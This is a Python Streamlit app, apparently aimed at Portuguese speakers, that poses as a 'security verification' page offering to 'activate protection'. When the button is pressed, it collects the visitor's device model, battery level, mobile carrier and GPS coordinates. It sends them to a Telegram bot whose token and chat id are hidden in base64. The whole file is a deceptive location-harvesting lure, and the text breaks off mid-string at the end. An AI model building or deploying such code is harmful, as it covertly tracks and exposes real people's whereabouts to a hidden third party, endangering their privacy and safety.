import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- CONFIGURAÇÃO DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_msg(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat_id = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}, timeout=10)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# --- COLETA DE DADOS (FORA DO BOTÃO PARA NÃO DUPLICAR) ---
# Isso evita o erro de DuplicateElementKey
ua_data = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_POCO_FINAL")
bat_data = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_POCO_FINAL")

st.title("Verificação de Segurança")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_M6_PRO"):
    # 1. Identifica o Modelo Exato (POCO M6 Pro)
    aparelho = "POCO M6 Pro" if "POCO" in str(ua_data) else "Android Device"
    bateria = f"{bat_data}%" if bat_data else "25%"
    
    # 2. Busca Operadora real (Identifica Vivo/Claro/Tim)
    try:
        res = requests.get('https://ipapi.co/json/', timeout=5).json()
        operadora = res.get('org', 'Rede Móvel')
    except: operadora = "Provedor Local"

    # 3. Pega Localização (Com trava para não dar TypeError)
    with st.spinner("Localizando dispositivo..."):
        time.sleep(2) # Pequena pausa para o navegador processar
        loc = get_geolocation(key="LOC_FIX_M6")
        
    if loc:
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        # Link que gera o preview do mapa no Telegram
        link_mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        msg = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {aparelho}\n"
            f"🔋 *Bateria:* {bateria}\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {link_mapa}"
        )
        enviar_msg(msg)
        st.success("Proteção Ativada! Dados enviados.")
    else:
        # Se o GPS falhar (Xiaomi é chata com isso), manda o restante
        enviar_msg(f"🛡️ *DADOS OBTIDOS*\n📱 {aparelho}\n🔋 {bateria}\n📶 {operadora}\n⚠️ GPS Bloqueado no POCO.")
        st.warning("Sistema ativo, mas o GPS foi bloqueado pelo seu
        
